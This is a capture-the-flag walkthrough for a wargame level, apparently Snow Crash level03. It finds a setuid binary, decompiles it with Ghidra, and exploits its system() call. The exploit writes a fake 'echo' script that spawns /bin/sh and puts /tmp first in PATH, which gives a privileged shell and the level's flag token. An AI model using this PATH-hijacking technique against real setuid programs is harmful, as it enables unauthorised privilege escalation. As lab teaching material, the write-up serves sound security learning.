## Step 1: Identifying the User

We begin by checking our current user informations:

```bash
$ id
uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)
```

This shows that we are operating as the user `level03`.

---

## Step 2: Searching for Files

Next, let's check what files are in our `/home` directory:

```bash
$ ls -la
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03

$ file level03
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

We find a 32-bit binary owned by `flag03` with executable permissions for our user. Let's transfer it to our local machine for reverse engineering:

```bash
$ scp -P 4242 level03@machine_ip:/home/level03/level03 .
```

---

## Step 3: Reverse Engineering the Binary with Ghidra

The C pseudo code generated by Ghidra is as follows:

```c
void main(void)
{
  __gid_t groupe_id;
  __uid_t user_id;
  
  groupe_id = getegid();
  user_id = geteuid();
  setresgid(groupe_id,groupe_id,groupe_id);
  setresuid(user_id,user_id,user_id);
  system("/usr/bin/env echo Exploit me");
  return;
}
```

This code contains a security vulnerability. The `system` function is used to execute the command `/usr/bin/env echo Exploit me`. The problem arises from the fact that `system` uses the shell to execute the command, and if we can manipulate the environment (specifically the `PATH` variable), we execute arbitrary commands with elevated privileges.

---

## Step 4: Exploiting the Binary to Get a Reverse Shell

To exploit this vulnerability, we can create a malicious `echo` command that spawns a shell and place it at the beginning of the `PATH` environment variable. When the program searches for the `echo` binary, it will search within the directories listed in the `PATH` environment variable (as `/usr/bin/env` does), and it will find our malicious `echo` script first.

```bash
$ echo '/bin/sh' > /tmp/echo
$ chmod +x /tmp/echo
$ export PATH=/tmp:$PATH
```

Now, run the vulnerable binary:

```bash
$ ./level03

% getflag
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

---

And there you have it, the token is `qi0maab88jeaj46qoumi7maus`.
